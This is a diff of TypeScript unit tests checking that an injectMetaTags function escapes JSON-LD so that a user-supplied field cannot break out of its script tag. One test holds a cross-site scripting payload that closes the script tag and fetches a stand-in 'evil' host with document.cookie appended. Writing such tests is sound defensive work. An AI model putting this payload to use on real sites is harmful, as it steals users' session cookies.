@@ -436,6 +436,59 @@ describe("resolveMetaTags — ?artwork=<slug> modal-share variant (issue #569)",
   });
 });
 
+describe("injectMetaTags — JSON-LD script-context escaping (issue #683)", () => {
+  function baseMeta(jsonLd: Record<string, unknown>[]): Parameters<typeof injectMetaTags>[1] {
+    return {
+      title: "T",
+      description: "D",
+      ogTitle: "OT",
+      ogDescription: "OD",
+      ogType: "website",
+      ogUrl: "https://x/",
+      ogImage: "https://x/og.png",
+      jsonLd,
+    };
+  }
+
+  it("neutralizes a </script> breakout attempt in an attacker-controlled field", () => {
+    const hostileBio = '</script><script>fetch("//evil/"+document.cookie)</script>';
+    const html = "<head>__JSON_LD__</head>";
+    const out = injectMetaTags(html, {
+      ...baseMeta([
+        {
+          "@context": "https://schema.org",
+          "@type": "Person",
+          name: "Attacker",
+          description: hostileBio,
+        },
+      ]),
+    });
+    // The literal breakout sequence must never appear unescaped.
+    expect(out).not.toContain("</script><script>");
+    // Exactly one script tag was emitted — the payload didn't split it into more.
+    expect(out.match(/<script type="application\/ld\+json">/g)).toHaveLength(1);
+    // The escaped form is present and, once parsed back out of the script
+    // body, reconstitutes the original (unescaped) string — the escaping is
+    // representational only, not lossy.
+    const match = out.match(/<script type="application\/ld\+json">([\s\S]*?)<\/script>/);
+    expect(match).toBeTruthy();
+    const parsed = JSON.parse(match![1]);
+    expect(parsed.description).toBe(hostileBio);
+  });
+
+  it("escapes bare & and > even without a full breakout sequence", () => {
+    const html = "<head>__JSON_LD__</head>";
+    const out = injectMetaTags(html, {
+      ...baseMeta([{ "@type": "Thing", name: "Tom & Jerry <3" }]),
+    });
+    expect(out).toContain("\\u0026");
+    expect(out).toContain("\\u003c");
+    const match = out.match(/<script type="application\/ld\+json">([\s\S]*?)<\/script>/);
+    const parsed = JSON.parse(match![1]);
+    expect(parsed.name).toBe("Tom & Jerry <3");
+  });
+});
+
 describe("resolveMetaTags — /curator-gallery/:id (issue #569)", () => {
   function baseGallery(overrides: Record<string, unknown> = {}): Record<string, unknown> {
     return {
